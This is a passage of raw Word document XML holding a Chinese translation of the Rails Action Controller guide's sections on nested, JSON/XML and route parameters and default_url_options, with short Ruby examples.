          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:client]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的值会是</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>{"name" =&gt; “Acme”, “phone” =&gt; “12345”, “address” =&gt; {"postcode" =&gt; “12345”, “city” =&gt; “Carrot City”}}</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。注意在 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:client][:address]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的嵌套哈希。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="716A00B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注意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哈希实际上是来自 Active Support 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>HashWithIndifferentAccess</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的一个实例，它表现得像是一个哈希使得你可以互换地使用符号和字符串作为键。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AAB98C6"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3.2 JSON/XML 参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7410A14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如果你在建造一个 web service 应用，你可能会发现接收 JSON 或 XML 格式的参数更加舒适。Rails 会自动地转换你的参数到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哈希中，这样你就可以存取它就像你使用表单数据一样。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D08B16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举例来说，如果你发送此 JSON 参数：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1189CF40" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53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6E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>{ "company": { "name": "acme", "address": "123 Carrot Street" } }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EE08B2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你会得到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:company]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> as </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>{ :name =&gt; “acme”, “address” =&gt; “123 Carrot Street” }</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3746A31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同样，如果你在你的初始器中打开 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.wrap_parameters</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者在控制器中调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>wrap_parameters</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，你可以安全地忽略 JSON/XML 参数中的根元素。默认情况下，参数会自动复制并包裹到以你控制器名字为键的哈希中。所以上面的参数也可以写为：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BEBA06B" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53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6E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>{ "name": "acme", "address": "123 Carrot Street" }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0975F46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这里假定你在发送数据到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>CompaniesController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中，数据将会被包裹进 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:company</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 键中，像这样：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="30BE0AA8" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0D2DCA7E" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="638145445"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>{ :name</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "acme", :address</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "123 Carrot Street", :company</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :name</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "acme", :address</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "123 Carrot Street"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="05ABA26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你可以定制键名或指定你想包裹的参数，参考 </w:t>
      </w:r>
      <w:hyperlink r:id="rId353" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>API 文档</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24830FCF"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3.3 路由参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5302345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params</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 哈希总是包含 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:controller</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:action</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 键，但是你应该使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>controller_name</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>action_name</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法来存取这些值。其他路由定义的各项参数，比如 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:id</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 也可以被使用。举例来说，想象一列用户可以显示激活或未激活。我们可以添加一个路由来在一个 “漂亮的” URL 中获取 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:status</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7176"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="0BC28C07" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="169FCE85" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1298030382"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match '/clients/:status'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'clients#index', :foo</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "bar"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4182958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在此例中，当一个用户打开 URL </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/clients/active</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params["status]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会被设定为“激活”。当这个路由被使用时，</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:foo]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 也会被设定为 “bar” 就像通过查询字符串传递过来一样。</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:action]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会包含 “index” 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49AE28BD"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 xml:space="preserve">3.4 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>default_url_options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395DC15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你可以通过定义一个叫作 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>default_url_options</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的方法设定 URL 生成的全局默认参数。该方法必须返回一个希望默认值的哈希，键必须都为符号：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6456"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="65FE0328" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5CCDEE0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ApplicationController &lt; ActionController::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="633280A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default_url_options</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="237F54C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{:locale</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; I18n.locale}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66E4074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54F8C08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5CCBFDC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当生成 URL 时，这些选项会被用为一个起始点，因此它们可以被 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>url_for</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 调用中传递的选项重写。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18D2C85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如果你在 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ApplicationController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中定义了 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
